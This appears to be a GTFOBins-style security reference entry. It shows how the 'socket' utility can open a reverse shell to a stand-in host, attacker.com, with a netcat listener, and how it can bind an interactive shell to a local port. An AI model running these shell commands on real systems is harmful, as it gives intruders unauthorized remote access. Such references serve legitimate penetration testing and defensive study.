# GTFOBin: socket

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell.

```
RHOST=attacker.com
RPORT=12345
socket -qvp '/bin/sh -i' $RHOST $RPORT
```

## Bind shell

It can bind a shell to a local port to allow remote network access.

Run `nc target.com 12345` on the attacker box to connect to the shell.

```
LPORT=12345
socket -svp '/bin/sh -i' $LPORT
```